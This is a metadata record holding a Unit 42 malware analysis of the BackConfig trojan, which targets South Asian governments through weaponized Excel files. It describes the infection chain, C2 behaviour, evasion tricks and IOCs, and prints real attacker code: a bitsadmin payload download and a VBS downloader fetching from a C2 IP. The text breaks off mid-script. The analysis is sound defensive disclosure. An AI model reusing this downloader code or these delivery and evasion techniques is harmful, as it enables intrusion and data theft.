{
    "id": "7490185b-cb8a-4c50-9a04-5224951a5107",
    "created_at": "2022-10-25T16:48:12.235909Z",
    "updated_at": "2025-03-27T02:15:06.176309Z",
    "deleted_at": null,
    "sha1_hash": "d0acc76ee3510cbde8145e5c7d83e42f8b863123",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-05-15T04:21:47Z",
    "file_modification_date": "2020-05-15T04:21:47Z",
    "file_size": 1624559,
    "plain_text": "# Updated BackConfig Malware Targeting Government and Military Organizations in South Asia\n\n**[unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations](https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/)**\n\nAlex Hinchliffe, Robert Falcone May 12, 2020\n\n## Executive Summary\n\n[Unit 42 has observed activity over the last 4 months involving the BackConfig malware used by](https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/)\nthe Hangover threat group (aka Neon, Viceroy Tiger, MONSOON). Targets of the spear-phishing\nattacks, using local and topical lures, included government and military organizations in South\nAsia.\n\nThe BackConfig custom trojan has a flexible plug-in architecture for components offering various\nfeatures, including the ability to gather system and keylog information and to upload and execute\nadditional payloads.\n\nThe initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via\ncompromised legitimate websites for which the URLs are most likely shared via email. The\ndocuments use Visual Basic for Applications (VBA) Macro code which, if enabled by the victim,\nstarts an installation process consisting of multiple components that result in the plug-in loader\npayload being downloaded and executed. The modular nature certainly allows for quicker\nchanges to individual components and, perhaps more importantly for the attackers, splits up the\nmalicious behaviors in such a way that could thwart sandbox and dynamic analysis systems,\nespecially when analyzing the components in isolation.\n\n[Our threat prevention platform with WildFire detects activity associated with this threat group,](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention)\n[while simultaneously updating the ‘malware’ category within the PAN-DB URL filtering solution for](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\nmalicious and/or compromised domains that have been identified.\n\n\n-----\n\nIndicators of compromise related to this research are documented at the end of this report and in\nthe Adversary Playbook for the Hangover threat group that can be accessed in the Unit 42\nPlaybook Viewer.\n\n### Starting Point\n\nUnit 42 first saw activity involving the Windows PE executable file (SHA256:\n84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c) when searching\nAutoFocus data related to particular sectors and countries of interest.\n\nThe file was first seen on January 19th, 2020, having been downloaded by two organizations — a\ngovernment department in one country and a military organization in another — within minutes of\neach other. The source of the download was http://212.114.52[.]148/request/httpsrequest and the\nfile httpsrequest was stored locally as dphc.exe. More details on how the malware was delivered\nare described later in the blog.\n\nThe choice of terminology in URL paths and file names when delivering BackConfig malware in\nthis, and other campaigns discussed later on, is clearly to blend in as benign operations, paths\nand filenames. Although spelled differently, it could be easy to believe the payload relates to the\nDHCP networking service.\n\nThe purpose of this malware is to allow the actors to download and execute an executable file, as\nwell as download and run batch files to run commands on the end system.\n\nThis sample has a custom “decryption” routine that subtracts six from each character. The\nfollowing strings are decrypted using this method:\n\nlinkrequest[.]live\n\\\\Adobe\\\\Driver\\\\dwg\\\\pid.txt\n\\\\Adobe\\\\Driver\\\\dwg\\\\\n\\\\Adobe\\\\Driver\\\\dwg\\\\wuaupdt.exe\n\nThe Trojan reads the following file to use in the URL of the C2 beacon. If the file does not exist,\nthe executable will exit without performing any further activities. The pid.txt file is created during\nthe earlier delivery and installation phases starting with the weaponized Excel document. More\ninformation about this setup process is covered later in the delivery section. As previously\nmentioned, this behavior makes an automated analysis of the individual executable payload\ncomponent harder.\n\n%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\n\nThe C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE flag used when calling\nthe HttpOpenRequestA function. The beacon HTTP request will look like the following:\n\nGET /orderme/[contents of pid.txt file] HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\n@/NEW\nHost: linkrequest[.]live [resolving to 23.106.123[.]87]\n\n\n-----\n\nThe Trojan will look for the following field and values within the HTTP response header:\n\n“Content-Type: application”\n“Content-Type: xDvsds”\n“Content-Type: Bw11eW”\n\nIf the content-type field contains a value of application, the Trojan will extract a filename from the\nHTTP response headers between the string filename and Content-Transfer-Encoding. It will use\nthis filename to create a file in the %USERPROFILE%\\Adobe\\Driver\\dwg\\ folder, which it will write\nthe data in the HTTP response to. Based on the other two Content-Types, we believe the\nfilename provided will be either “wuaupdt.exe” or test.bat.\n\nIf the content-type field has a value of xDvsds, the Trojan will attempt to execute the following file\nusing ShellExecuteA and the “open” method:\n\n%USERPROFILE%\\Adobe\\Driver\\dwg\\wuaupdt.exe\n\nIf the content-type field has a value of Bw11eW, the Trojan will attempt to execute the following\nfile using ShellExecuteA and the “open” method:\n\n%USERPROFILE%\\Adobe\\Driver\\dwg\\test.bat\n\nAt the time of writing, the C2 appeared inoperational and no further payloads were seen. We\nbelieve that the resultant wuaupdt.exe file would then provide further capabilities to steal\ninformation, log keystrokes, and provide the ability to run additional commands either directly or\nvia additional plugins which it would download, as documented by the Qihoo 360 Threat\n[Intelligence group in their investigation of prior campaigns here.](https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/)\n\nUnit 42 has conducted cursory binary diffing for many of the BackConfig executable files and did\nnot find any non-library function overlaps that would suggest that the payloads are based on the\n[YTY or EHDev frameworks as mentioned here and here.](https://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia)\n\n### PE Metadata\n\nThe malware sample contains some interesting static artifacts including self-signed digital\ncertificates used to sign the executable purporting to be software from the Foxit Software\nIncorporated company based in California. It is not known why the actors picked this company —\nand others listed in Table 1 below — to impersonate but, as previously mentioned, their use of\nfilenames and URLs makes their payloads appear benign and trustworthy.\n\nUsing this meta-data, together with information gleaned from infrastructure investigation, Unit 42\nwere able to pivot around on AutoFocus data to find additional BackConfig PE executable\nsamples. Those samples from the last 12 months are listed in Tables 1 and 2 below.\n\n\n#### SHA256 Compilation Time (UTC)\n\n\n#### First Seen (Pacific) Signer Name\n\n\n#### 84e5629… 01/20/2020 7:26:09am 01/19/2020 11:49:03pm\n\n\n#### Foxit Software Incorporated\n\n\n-----\n\n#### 18ce3ee… 10/10/2019 9:22:11am 01/16/2020 4:30:26pm\n\n 4a4bc01… 11/21/2019 9:19:49am 01/16/2020 1:31:46am\n\n 91c67c1… 11/21/2019 9:19:49am 12/02/2019 2:03:41am\n\n de5b670… 11/21/2019 9:19:49am 11/21/2019 11:59:05pm\n\n f79ebf0… 10/28/2019 5:35:26am 11/09/2019 10:32:09pm\n\n 31faeef… 10/10/2019 9:22:11am 10/13/2019 10:11:04pm\n\n d87b875… 09/12/2019 5:54:04am 09/26/2019 9:32:19am\n\n 1510996… 12/05/2018 4:35:03am 04/09/2019 10:30:16am\n\n\n#### wind0ws\n\n NVIDIA Corporation\n\n Foxit Software Incorporated\n\n Digicert Global\n\n Foxit Software Incorporated\n\n\n_Table 1. Describing PE compile times and Digital signatures used, ordered by first seen._\n\nThe Compilation Time stored in executable (SHA256: 84e5629…) appears to be after the point at\nwhich the file was first seen by our WildFire analysis system. While the PE file timestamp could\nbe modified post-compilation, the oddity is more likely explained away with time zones — 2349\nPacific time on the 19th is 1350 in Bangladesh on the 20th, and 7:26am UTC is in the range of\n11:26 to 13:26 across the South Asia region, which would make the sample compilation quite\nrecent with respect to the delivery of it.\n\nMore details about the self-signed digital certificates, as well as full hashes, can be found in the\nIOCs section at the end of this report.\n\nThe following table shows the version information from the same PE files, grouped by similar File\nDescription fields. The order remains the same, except for the sample (SHA256: 18ce3ee…)\nwhich was first seen January 16th, 2020 but for some reason reverted to using exact version\ninformation seen in samples two to three months prior. Namely, Link Finder.\n\n\n#### SHA256 File Descrip‐ tion\n\n 84e5629… Альберт (Albert, in English)\n\n\n#### File Version\n\n\n#### Product Name\n\n\n#### Product Version\n\n\n#### Copyright\n\n\n#### 06.10.2015 Альберт 01.05.2015 Copyright @ 2015- 2026 secosec\n\n\n#### 4a4bc01… Ссылка 01.01.12 ссылка 10.01.2015 Copyright @ 2011- 2021 secosec Inc.\n\n\n-----\n\n#### Все права защищеныk (All rights reserved, in English)\n\n\n#### 91c67c1…\n\n de5b670…\n\n\n#### (Link, in English)\n\n\n#### 18ce3ee… Link 01.01.12 Link 13,9,1632 Copyright @2011- Finder Finder 2020 Techtest Inc. All\n f79ebf0… Rights Reserved\n\n 31faeef…\n\n d87b875… scrapper 01.12.001 scrapper 13,6,1662 Copyright @Scrapper Ltd Reserved\n\n\n#### 1510996… system process\n\n\n#### 2,1,1,2015 system process cleaner\n\n\n#### 2,1,1,2015 Copyright © 2004- 2018 Foxit Software Inc. All Rights Reserved\n\n\n_Table 2. Describing PE version info metadata, ordered by first seen and grouped on matching_\n_data._\n\nOf the set, the file (SHA256: 1510996…) has most consistency in terms of a theme, using the\nFoxit Copyright information, self-signed digital signature and even using the company logo, as\nshown in the Figure below, for the executable file’s icon. The file’s copyright information only\ndiffers from that of Foxit’s Reader software by a missing period symbol, implying it was copied\nrather than created.\n\nFigure 2. Evolution of delivery payloadsThe actors then moved to use seemingly fictitious\ncompany and product names while using a mixture of signer names in their digital signatures. No\nfile icons were used at all over the last 11 months.\n\nRecent samples also included Cyrillic text in the file description, product name, and copyright\nfields, as shown and translated in the table above. It’s hard to know if this is an attempt to set\nfalse flags as to the origins of the BackConfig malware, or perhaps to make the content more\nrelevant to specific targets within the victim organizations.\n\n### Delivery and Installation\n\nIn this section, we describe how the various payloads are delivered based on what we have seen\nin our customer networks, as well as what we have established through open-source research.\nUnit 42 has yet to see any evidence of weaponized documents used to deliver BackConfig being\nattached on phishing emails and that phishing URL links in emails appear to be the Hangover\ngroup’s modus operandi.\n\nThe remainder of this section focuses largely on Object Linking and Embedding (OLE) Microsoft\nExcel documents, as they are most commonly used by the Hangover group, at least when it\ncomes to the BackConfig malware. Through infrastructure analysis however, Unit 42 was able to\nfind a BackConfig PE sample (SHA256:\ne28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f; first seen\n10/24/2019) using the C2 domain matissues[ ]com and dropped by the weaponised Rich Text\n\n\n-----\n\nFormat (RTF) file (SHA256:\n752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f) from the same day.\n[The RTF used the CVE-2017-11882 exploit against equation editor vulnerabilities in Office](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882)\napplications to execute the PE sample which was a unique exploitation method compared to all\nother samples analyzed.\n\n### Compromised Third-Party Infrastructure\n\nContinuing to pivot on data obtained from the samples found thus far, we discovered some\nrelated URLs relating to compromised third-party infrastructure supporting the delivery of the\nBackConfig malware. The following table lists some examples of compromised sites delivering\nweaponised XLS files with filenames, such as Circular_No_03.xls (SHA256:\n0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf) and\nCircullar_Nov_2017.xls (SHA256:\ned638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb) implying (even\nwith incorrect spelling) that the contents is, or relates to, a letter or advertisement which is\ndistributed to a large number of people.\n\n\n#### SHA-256 First Seen\n\n be3f12b… 2019- 10\n\n 0aa5cf1… 2018- 09\n\n ed638b5… 2017- 11\n\n\n#### Related URL Description Loca‐ tion\n\n\n#### http://alphamike.com[.]mv/housing Shipping agency for freight for‐ warding and cargo delivery.\n\n http://mgamphs.edu[.]bd/info/ (down) Muhurigonj Academy of Music and Performance High School. Reference.\n\n\n#### http://nsaimmigration[.]com/userfiles/im age/ fbr.php and nphp_registration_for‐ m.php (both HTTP 404)\n\n http://webtechhub[.]com/wordpress/wp- content/images/fbr_circular.php\n\n\n#### Consultant and Legal Ad‐ vice company supporting stu‐ dents to live and study abroad.\n\n Web design and dev site running out‐ dated Word‐ Press application\n\n\n#### Pa‐ kistan\n\n Pa‐ kistan\n\n Mal‐ dives\n\n Bangl adesh\n\n\n_Table 3. Compromised third-party infrastructure to support delivery of BackConfig._\n\n\n-----\n\nGiven the targeting related to these threats, and the compromised third-party websites, we\nbelieve the use of “fbr” in some of the URLs above likely relates to the Federal Board of Revenue\n(FBR) government organization of Pakistan. The “fbr” theme also runs into the VBA macro code.\nFile ed638b5… contains the statement Const WelcomePage = “FBR”.\n\nThe old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor\n(PHP) server-side scripts to deliver the weaponized XLS files. Instead, the pages simply used\nHTTP response status 301 (Moved Permanently) for URL redirection to said XLS, initiating the\ndownload. More recent examples make use of PHP with URL filenames matching the social\nengineering theme, such as “fbr”. In addition, the actors use the PHP script to log any visitors to\nthe page noting in a file named “info.txt” the datetime stamp of the event, the client operating\nsystem, and their IP address.\n\nThe location of the compromised third-party infrastructure or the organizations legitimately using\nthem, align with the targeting Unit 42 has seen. This could be pure coincidence, a sign from the\nthreat actors that their intention is to take advantage of weaknesses in the target country’s wider\ninfrastructure, or the threat actors leveraging in-country infrastructure that may be considered\nmore trustworthy by the intended victims and their security solutions.\n\nPalo Alto Networks’ WildFire sandbox analyzed sample ed638b5… on November 8th, 2017, and,\nas described in the table above, the sample was hosted on two compromised websites: a\nBangladesh school and a Maldivan shipping agency. While Unit 42 has not seen Hangover\nactivity in the Maldives, the archipelago is in the region alongside other known targets and\ninterestingly, swore in a new President about a week after Unit 42 analyzed the sample.\n\nThe EXE payload (SHA256:\n4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd) downloaded\ndirectly by the VBA code in sample ed638b5… from the URL below relates to those documented\n[by BitDefender here. To date, Unit 42 has only seen 6 similar samples since the late-2017](https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/)\ntimeframe for this sample, compared to many more prior, perhaps indicating a change over of the\ncustom payloads used by the Hangover group. Certainly, there are some overlaping Tactics\nTechniques and Procedures (TTPs) between the older samples and the more recent BackConfig\nsamples.\n\nhttp://chancetowin.quezknal[.]net/appstore/updatepatch/logs.exe\n\n### Evolution of Delivery Payloads\n\nBefore moving on to describe the most recent samples and installation methods used by the\nHangover actors, the timeline figure below provides a high-level view of the evolution in TTPs\nused.\n\n\n-----\n\nFigure 2. Evolution of delivery payloads\n\nDespite the evolution over the years, some habits are hard to break. Firstly, every weaponized\nXLS Unit 42 has investigated loads a fake error message, such as the one shown in Figure 3\nbelow, to trick the victim into thinking that the file is corrupt and thus nothing has — or will — load\nas intended. Another fictitious error message text has been used in the past often with poor\nspelling or grammar.\n\nFigure 3. Example fake error message displayed to the victim.\n\nSimilarly, the version information metadata stored in all the Excel documents analyzed share the\nsame Author and Last Modified By names – Testing.\n\nThe following subsections describe the campaigns and malware as highlighted by the three most\nrecent milestones in the timeline figure above.\n\n### 2019 Milestone: Multi-Component\n\nRegistration Form.xls (SHA256:\nbe3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461) listed in Table 3\nabove provides an example of the types of lures used by the threat actors.\n\n\n-----\n\nUpon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on\ntop white-background cells. As the filename suggests, it’s a registration form and relates to the\nNaya Pakistan Housing program run by the Pakistani government to help solve the housing\nshortfall in the country. Eligible citizens include government employees and registration forms\nwere due by October 15th, 2019 (extended through November 15th), meaning the timing and the\nlure of the campaign on October 25th were clearly planned to increase the chances of\ncompromise.\n\nFigure 4. Social engineering lure against Pakistan government in October 2019\n\nAs the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS file\nbe3f12b… was hosted at the URL listed in row 1 of Table 3 above. However, because of the\nfollowing points we have high confidence in the campaign relationship between the two\n\n\n-----\n\n1.\n\n1. AutoFocus and VirusTotal first processed the XLS file be3f12b… on October 25th,\n\n2019\n2. VirusTotal processed the nsaimmigration… URL on the same day\n3. A specific HTTP GET request URL using the notation nphp_registration_form.php?r=\n\nwas processed in VirusTotal on the same day, and has relations to\nhttp://185.203.119[.]184/fin_div/session, which matches the IP address and URL\nstructure in the VBS code dropped by the XLS be3f12b….\n4. The name of the PHP webpage nphp_registration_form.php relates to the filename of\n\nthe XLS.\n\nThe VBA macro code in the XLS file be3f12b… differed somewhat from that of the samples of the\nprevious years. Instead of directly storing encoded EXE files or running batch shell commands\ndirectly from the VBA code itself, it retrieved the content from hidden columns in the Excel sheet,\nstarting at column 27 or “AA”, which is likely to be off-screen for most people. Once the font\ncolour was changed, the “setup” batch code component as per previous variants, and the new\nVisual Basic Script (VBS) downloader component were revealed in columns AA and AB,\nrespectively, as shown in figure 5 below.\n\nFigure 5. VBS downloader and BAT setup file revealed in the XLS sheet.\n\nMacro VBA code in the XLS parses the content of the two columns line by line writing the\ncontents to their respective files on disk and executing them following the same process flow as\ndescribed below in Figure 6.\n\n### 2019 Milestone: BITS and ZIPs\n\nA more recent weaponized XLS file (SHA256:\n021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b) was analyzed by\nWildFire on November 15th, 2019 and exposed some new techniques. On this occasion, the VBA\nmacro code contained a decimal-encoded ZIP file of only 1,062 bytes in size. Inside the ZIP\narchive were two text files that would be decompressed to a folder driverkit. One file, driverkit.bat,\nis the “setup” BAT file already discussed in this report and listed in the appendix section. The\nother file, Winmgt.txt, is an adaptation of the VBS downloaded also described in this report.\n\n\n-----\n\nHowever, instead of a direct HTTP download using an MSXML DOM object, this version writes\nthe following contents to Winmgt_Drive.bat, which is executed by a third scheduled task created\nby the “setup” BAT file.\n\n\n#### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n\n#### echo off\n\n bitsadmin /transfer Microsoft_Update /download /priority high\n\n http://185.203.119[.]184/winmgt/winmgt.exe\n\n %USERPROFILE%\\Adobe\\Driver\\pdf\\winmgt.exe\n\n del %0\n\n\n### 2020 Milestone: Fine Tuning\n\nThe following execution flow diagram is based on one of the most recent weaponized documents\nUnit 42 has seen Invoice.xls (SHA256:\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c; first seen 2020-0115).\n\nThe infection process consists of multiple components as just described. The “setup” batch (BAT)\nfile coordinates much of the infection process of the BackConfig plug-in loader once the VBA has\nwritten it to disk and executed it.\n\n\n-----\n\nFigure 6. Execution flow of BackConfig malware\n\nThe numbered bullet list below describes Figure 6.\n\n\n-----\n\n1.\n\n1. Text file Drive.txt (SHA-256:\n\n4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1) is\ncreated and contains the decimal-decoded VBS content.\n2. Similarly, the VBA code then writes batch code to another text file – Audio.txt. The\n\ncontent of both files is shown in the appendix section of this report.\n3. Audio.txt is renamed to Audio.bat and executed.\n4. Audio.bat cleans up any files and folders related to previous infections, and recreates\n\nthe required environment including creating the aforementioned pid.txt file, and\nsetting various folders and files to be hidden from a default Windows Explorer view.\nThe contents of pid.txt is the victim’s computer name concatenated with a hyphen\nfollowed by a random number, although I believe the code used would not work as\nintended.\n5. Audio.bat continues by creating two scheduled tasks referencing two files that are yet\n\nto exist: dphc.exe will run every 10 minutes and Drive.vbs at 20 minute intervals.\n6. Finally, before deleting itself, Audio.bat will rename Drive.txt to Drive.vbs. When\n\nDrive.vbs is eventually executed by the task scheduler, it will download the\nBackConfig executable payload. In the case of file 8892279f3… the remote location\nis http://185.203.119[.]184/Dropbox/request.\n7. When dphc.exe is eventually executed by the task scheduler, it first checks for the\n\npresence of pid.txt (step 4.) and only continues if the file exists.\n\nUltimately, the XLS writes two files to disk, one of which — the BAT — immediately modifies some\nsystem settings and creates two scheduled tasks. However, this behaviour may not be enough to\ndetermine the components as malicious. Only after 20 minutes will the task scheduler execute the\nVBS downloader component and launch the BackConfig loader EXE, by which time analysis\nsystems may have stopped monitoring.\n\n### ATT&CK\n\nThe following table describes the TTPs associated with the multiple campaigns described in this\nreport.\n\n#### Tactic Technique (Mitre ATT&CK ID)\n\n\n#### Technical Information Gathering\n\n\n#### Acquire OSINT data sets and information (T1247)\n\n Conduct social engineering (T1249)\n\n\n#### Adversary Opsec Compromise 3rd party infrastructure to support delivery (T1312)\n\n Build Capabilities Create custom payloads (T1345)\n\n Obtain/re-use payloads (T1346)\n\n Stage Capabilities Upload, install, and configure software/tools (T1362)\n\n Initial Compromise Spear Phishing Link (T1192)\n\n\n-----\n\n#### Execution User Execution (T1204)\n\n Exploitation for Client Execution (T1203)\n\n Execution, Persistence Scheduled Task (T1053)\n\n Defense Evasion Code Signing (T1116)\n\n Deobfuscate/Decode Files or Information (T1140)\n\n Hidden Files and Directories (T1158)\n\n Obfuscated Files or Information (T1027)\n\n\n#### Defense Evasion, Execution\n\n Defense Evasion, Persistence\n\n\n#### Scripting (T1064)\n\n BITS Jobs (T1197)\n\n\n#### Command & Control Commonly Used Port (T1043)\n\n Standard Application Layer Protocol (T1071)\n\n Standard Cryptographic Protocol (T1032)\n\n Remote File Copy (T1105)\n\n## Conclusion\n\nThe Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to\nUnit 42’s visibility, government and military organisations in South Asia using spear-phishing\nemails containing letters or government forms to lure victims into browsing to compromised\nwebsites serving weaponized Excel documents that install the BackConfig Trojan. Almost\nexclusively, Unit 42 has seen the use of weaponized documents that require user execution. Only\nonce in the last six months have we seen use of exploits to circumvent the need for the user to\nexecute any part of the installation chain.\n\nThe evolution of BackConfig’s primary and secondary payloads has seen different methods used\nfor executing commands and deploying executables both with and without obfuscation.\n\nThe latest versions contain modular components making it easier to update and re-use code in\norder to rapidly deploy their campaigns in a timely manner to have the highest chance of success.\nThe method in which the latest samples execute also indicates the group’s focus on trying to\nevade sandbox and other automated analysis systems by breaking down malicious activity into\nchunks that each seem relatively benign.\n\nProtections:\n\n#### Cortex XDR protects endpoints from all malware, exploits and fileless attacks associated with Hangover actors.\n\n\n-----\n\n#### WildFire® cloud-based threat analysis service accurately identifies samples as‐ sociated with these malware families.\n\n Threat Prevention provides protection against the known client and server-side vulnerability exploits, malware, and command and control infrastructure used by these actors.\n\n URL Filtering identifies all phishing and malware domains associated with these actors and proactively flags new infrastructure associated with these actors be‐ fore it is weaponized.\n\n Users of AutoFocus™ contextual threat intelligence service can view malware associated with these attacks using the following tags: More information about the Hangover group and the BackConfig malware can be found in AutoFocus.\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise,\nin this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence\nto rapidly deploy protections to their customers and to systematically disrupt malicious cyber\n[actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.](http://www.cyberthreatalliance.org/)\n_(This is added to blogs pre-shared with the CTA, when loaded into WordPress it will be added_\n_when appropriate)._\n\n### Indicators of Compromise\n\n#### Delivery Documents\n\n56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c\n021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b\nbe3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461\n0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf\ned638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb\n752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using CVE2017-11882)\n\n#### Batch Files\n\n4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt /\n.bat from Naya Housing campaign)\nC94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9\n6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3\n750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580\n5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295\nf64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e\n98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e\n\n\n-----\n\n29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096 (driverkit.bat)\nabe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003\n(Winmgt_Drive.bat uses bitsadmin)\n02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c\n\n#### VBS files\n\n87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1 (One_drivers.txt /\n.vbs from Naya Housing campaign)\n952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a\n(Down_LinkLog.vbs)\na1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs using\nBITS)\n\n#### EXE Payloads\n\n306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644\n0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92\n84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c\n18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9\n922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709\n4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5\n677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2\nd3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f\n91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1\nde5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a\nf79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b\n9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77\n6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e\ne28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f\n07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda\n31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848\n15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892\nD87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861\n167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e\n4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of older\nset of downloaders)\nb18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5 (driverkit.zip)\n\n#### Infrastructure\n\nlinkrequest[.]live (23.106.123[.]87)\nmatissues[.]com\nunique.fontsupdate[.]com\n185.203.119[.]184\n212.114.52[.]148\n\n#### Digital Signatures\n\n\n-----\n\nThe following list of self-signed digital certificates is not exhaustive, and only relates to those seen\non BackConfig PE executables samples over the past twelve months.\n\n**Foxit:**\n\nthumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01\nissuer: CN=Foxit Software Incorporated\nsubject: CN=Foxit Software Incorporated\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8\nvalid from: 1/1/2018\nvalid to: 1/1/2024\n\n**Wind0ws:**\n\nthumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0\nissuer: CN=wind0ws\nsubject: CN=wind0ws\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70\nvalid from: 1/1/2019\nvalid to: 1/1/2025\n\n**NVIDIA:**\n\nthumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3\nissuer: CN=NVIDIA Corporation\nsubject: CN=NVIDIA Corporation\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1\nvalid from: 1/1/2019\nvalid to: 1/1/2025\n\n# Appendix\n\nThe following VBS and BAT code was extracted from XLS sample (SHA-256:\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83).\n\nVBS downloader component (SHA256:\n4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)\n\n[Drive.txt -> Drive.vbs CODE]\n\n\n-----\n\n#### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7\n\n 8\n\n 9\n\n 10\n\n 11\n\n 12\n\n 13\n\n 14\n\n 15\n\n 16\n\n 17\n\n 18\n\n 19\n\n 20\n\n 21\n\n 22\n\n 23\n\n\n#### strFileURL = \"http://<strong>185.203.119[.]184/Dropbox/request\"</strong>\n\n Set oShell = CreateObject(\"WScript.Shell\")\n\n   strHomeFolder =\n\n oShell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n\n   strPath = \"<strong>C:\\Drivers\\dphc.exe\"</strong>\n\n On Error Resume Next\n\n Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")\n\n   objXMLHTTP.open \"GET\", strFileURL, false\n\n   objXMLHTTP.send()\n\n If objXMLHTTP.Status = 200 Then\n\n Set objADOStream = CreateObject(\"ADODB.Stream\")\n\n objADOStream.Open\n\n objADOStream.Type = 1 \n\n objADOStream.Write objXMLHTTP.ResponseBody\n\n objADOStream.Position = 0  \n\n Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n If objFSO.Fileexists(strPath) Then WScript.Quit()\n\n Set objFSO = Nothing\n\n objADOStream.SaveToFile strPath\n\n objADOStream.Close\n\n Set objADOStream = 